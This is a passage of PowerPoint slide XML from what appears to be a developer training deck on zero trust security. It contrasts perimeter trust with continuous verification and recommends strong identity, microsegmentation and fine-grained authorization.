        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>97</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="417525983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56B4-AC22-EE65-D57B-D1C538619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7C777-78F3-F7CF-C031-899F01A20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6EE49-59CC-B214-19AE-36FE62CC95C9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>It’s about designing systems under the assumption that </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>credentials, devices, or components can be compromised</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Traditional security: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>castle and moat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 🏰</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Get past the firewall (the drawbridge), and you’re “inside”.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Internal services trust other internal IPs.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Zero trust: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>modern airport</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> ✈️</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Even after you pass the front door, you’re continuously checked:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Boarding pass, ID at security.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Boarding pass again at the gate.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Sometimes another check at the jet bridge.</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5437EE66-F953-9204-DF06-A306F22EB4E0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>98</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="211709416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56D55-DDF5-392D-07FB-D5EC4722F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F9CFD-700C-A0D2-5569-C3E0CB012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81D8B-7340-36E7-7FD5-996C50A32F4A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Strong identities for users, devices, workloads</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>You can’t do zero trust without </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>strong, consistent identity</a:t>
            </a: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9A47C823-23DB-195B-6490-9A4655FF73B4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>99</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42128858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388F5-BF18-5988-B3EA-717FC6D7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CA044-F35A-1AB6-9640-0C6C17E6A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E0697-7A83-D70F-DF27-8BED8992CA25}"/>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322378F5-10F1-873B-4981-0B31BC37BD3F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>100</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="382471388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7520-2786-AFE5-D159-228C108AF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0CC77-3B14-7E67-A33F-5D414C84F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8DD5F-1654-8479-0825-E2938DDB1B51}"/>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9D638FF4-9A27-8C70-72D8-5380868E7865}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>101</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="41727604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1291-12A5-8513-D855-A9B9E7AB8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5F49-1004-BD6B-0185-5C42785C8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EC0FC-2D1F-E1B5-944E-869FA2BE428A}"/>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9873A3B8-3B2C-917D-8187-F71403475847}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>102</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="90195812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6842-B3E4-B7AF-5E55-0381D041B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0D2D9-8101-D956-2819-816D4D0D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B653D-C06A-C01E-970A-36449CE6B4F8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Zero trust </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>loves</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> microsegmentation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>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F4CAF7FE-267F-5D64-4F52-C1A54A26CB42}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>103</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="160644487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084A8-DCEC-F388-B836-B7E061A25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BD87E-AC13-C355-A150-6F1EB9161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237FC-FDD2-C0DC-D39A-4AB0274F6AB3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>https://learn.microsoft.com/en-us/security/zero-trust/deploy/identity?utm_source=chatgpt.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ABB6C83E-A321-1978-BCAF-7530C34F88CE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>104</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30686144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96CC-E725-A11A-E682-D3E701660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495A7-F8E6-F449-B70E-73F2D8D69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0A5D4-3F63-6D9D-3A13-B85F3B727300}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>East–west traffic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>zero trust</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> are just ways of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>being explicit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> about those answers.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>If you live in the old </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“internal network is trusted”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> world, you’ll write a lot of:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“internal-only” endpoints with no auth</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>services that trust any X-User-Id header</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>code paths that assume “if it reached me, it must be safe”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>In a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>zero trust</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> world, you assume:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>internal traffic can be hostile</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>every call needs identity + authorization</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>the network is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>not</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> a security boundary</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9DF00296-75CA-4C8C-1541-3D2D1EE9976C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>105</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="81581225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045E4-A4C3-64F4-E49C-BEB363F22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D7F93-6C75-C5A8-6E51-F18518E82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638B9C-5A34-7AA2-4D44-525C3DCDF8D7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Zero trust principles makes “secure coding” rules sharper, not fluffier</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Zero trust sounds like philosophy, but it sharpens very concrete dev rules:</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04D733AB-82B5-18FE-2107-E0AFA44DFB70}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>106</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="319586838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BC17-A895-512D-0F86-51A3CD3FB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8FC4B-736B-2041-1A55-C6C73A029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40424-A56E-5767-5F75-3582254DCB6C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>In code terms:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>No “god services” that can call everything.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>No catch-all admin role that bypasses all checks.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>More fine-grained permissions / scopes / roles.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>As a senior dev, this steers:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>How you design your </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>authorization model</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>How you shape </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>API contracts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (“this endpoint returns only what this caller type needs”)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>How you structure </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>service boundaries</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (“this sensitive operation must go through this dedicated service with tight policies”).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>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9E8F83A2-3F09-8DCB-DF26-E84D7A74180B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>107</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
